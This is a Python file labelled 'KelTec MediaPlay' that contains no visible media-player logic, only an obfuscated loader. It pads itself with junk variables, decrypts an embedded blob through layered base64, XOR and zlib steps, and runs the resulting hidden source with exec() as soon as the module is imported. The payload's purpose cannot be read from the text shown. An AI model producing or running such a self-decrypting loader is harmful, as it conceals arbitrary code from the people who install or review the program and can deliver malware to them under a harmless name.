# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 753222 ^ 922856
_lx1_1 = len("47a1b4")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-600681)
_lx3_3 = 277338 * 0
_lx4_4 = 782763 ^ 367203
_K = '25947f75a4cb828a60430715aec1061b84f16e17644050452d5ae1a9434f9749'
_M = 'MBcvX2AHIFWdsb4iTVCdS9dVmn6vueoTVzgOvMhJWRJvFz5BP1BmD8LnvSURVMEb0wSXePvvukNVOAe/yhAKTm0WORAwVTcIkbWy'
_D = '+dkzRXcc3pxFDzViCmlQBYuwA4qf97Zywtyaj2MoZ52YsQ7jyMJYDJhIHBaRqdaZk5ric8dSuMxZhpFl9qbwTmQ8fOEETqZW3ahIb3dlxkZ7jxA1+PGKqfGT6zF7t5iZ+Tcf3iTwYdB8Pt5KE4HkTqXexm7hRfMZpgb0WgY3kfBZXqQVEixgqrmSl6r4IYoZ91vd2Mg5PJPxe/o3glJdka47ciML/gOejCU1dG930clUIc7q8AjwbkeYjUW3qn4oxebb3++Hkz/1EsqUjy9c6ScCMTaNtgwDXmJMFNxnIwpPGip7zWJUJcbUADRdCCOEzKCcQPldL7vVfbi0H3YLOzvuSy0u1KCy8cHUfylKGguO5jBsuHZEUGotPmlkBbed36kejmNbTv8zwVhaXsDVnWDHuDiGeDcMM1TOPzkpzPAfWk4JiN9WK6YXu/mdQzyQIX6WVrYKneqWueGeMXxSAS7WqGhDMiB+7YEeWFZ2uE92NCjME95AMMX8moFvqUbCvKzliiCy/lhG+2dXc5cUkagLNF27lHDi6+CPDuau5RuBnjxKFJu/Vs2k2nn1OHpt4//V87d9eZ1r8gVLLFXMssj97aAoPobk0TDGJFEVaSrEejAJbKhQk15o6Mvd1rgDmKJ6AjcGmxqo2DhRjAktjA+xmKMgqzNZYx6kx3+dGQz7dl06wKaTatfSCpLFPa929fShCxZDlxuT4iRnkeBlBHDejMNszkH/UF3NpJ3Akf51JGO+QhtSDYBPhoK25RcNvduBEgFvyKyIWeytIqZE/EIWbvZ9xbZ97UH1LgCFPtr1koe73ZgZZzg48EYV9khTldYv6hInhfTQ19v1MPkT3jisWpTQz888W8D8Qk3RQtgY5JNkIkmKKLryFaEot/DlOs5buE6Kycq3zUrseQeNe9osdVgGgW4leuBhWWLMW/B8GxHV8y2Y6d6HNzjKvgWaJzC+J4vPZa5Auoly4E/ht9ckOlW5VGbTF5i9MnQxUXTH2FkPWyEvc9ILCtK/sz/pm+tA6+QVbls0b2zIuIvjLLaupVtGwNsr5ot8g1rsDGt75bVpfM9fV+nZKJmn60w0NZJeAK/fPD8YX8mEo4nncOtsA6XvfMAfN1sNApzlvNlk58y10Rc3j6J1CFwYEQQ/+MF7G0GRtTxYb8Bh4gdOdYOWq9E8Cuo05FunAN7SqWsSVkGDRdEYlf7LLMXtEiUU/M6lM3eH4lJtxfVAIU20julgufkhJ0d41BUVnuMVgu+exnv50TQ+HqPVUcThNV2Ws9rN0p/F+vjLGcXcxODZusCWUcvv9+4SBrukrnxtiwl1Q8M7iDcqI+GkOg0MJAa0THRLjOgcdbQTGSPddF8VhK9wXaf612ChPwtMHRyg7pSp6AxP0vAphcNJMiu8fJ4AkvWs7CFc9M3nyOz1U53sF2KA7CvhUkebnjiR7e9EonC59dCUTg8kcuElbXZ5Vvj/owk0jgpeapDgcxud7wj1xmj/OvSkLeYWNeFaMbDZiHSaiHdRcSxXzh9+Wd8suzLkhuEkNdO3UK2svZnnLOyhubm1XgPEZ+QnkkJ4/eUjbViryaar2FMXooS4EDpxlLC17m5nZnX9Tmr/YOMFEtoCI/M2utkx/vnZToPDkum4wtWHh9BDzcEoTJevPJixuQklwR5leHsIl1Cb04KSsviOGwKRSeAh9AYuhYcABHzc1impmXCa11gGNHN9nRdXmR59wkhTujsUPoBLqiTyM+et6VQWhnn3Bnah1SdkVy/Jc+Ec8VrDJQsnUo4SJlX2upiStDd+tOWUkvZVcZTo3xzWnHuJBWvn72qDrbvwxZV+Ay3yUMez3QNIN5XRPU9FOpuKVCqB'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})